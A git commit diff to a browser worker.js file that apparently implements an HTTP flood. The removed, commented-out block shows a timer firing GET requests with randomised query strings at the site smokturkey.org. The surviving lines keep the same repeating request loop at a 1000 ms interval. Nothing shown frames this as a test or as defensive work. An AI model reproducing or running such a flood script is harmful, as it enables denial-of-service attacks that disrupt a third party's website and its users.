8b34a0d49d654111ac745d7aac5f900a2fec8c7c
Yusuf Dolu <38819540+yusufdolu60@users.noreply.github.com>
2018-05-04 02:55:34 +0300

    Update worker.js

--- worker.js
+++ worker.js
@@ -12,25 +12,6 @@ self.addEventListener('message', function(e) {
 
 		xmlHttp.send(null);
 
-	}, 100);
-
-});
-
-
-/*
-self.addEventListener('message', function(e) {
-	
-	setInterval(function(){
-		
-		var url = 'http://smokturkey.org/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
-	
-		var xmlHttp = new XMLHttpRequest();
-		
-		xmlHttp.open("GET", url, true);
-		
-		xmlHttp.send(null);					
-		
 	}, 1000);
 
 });
-*/
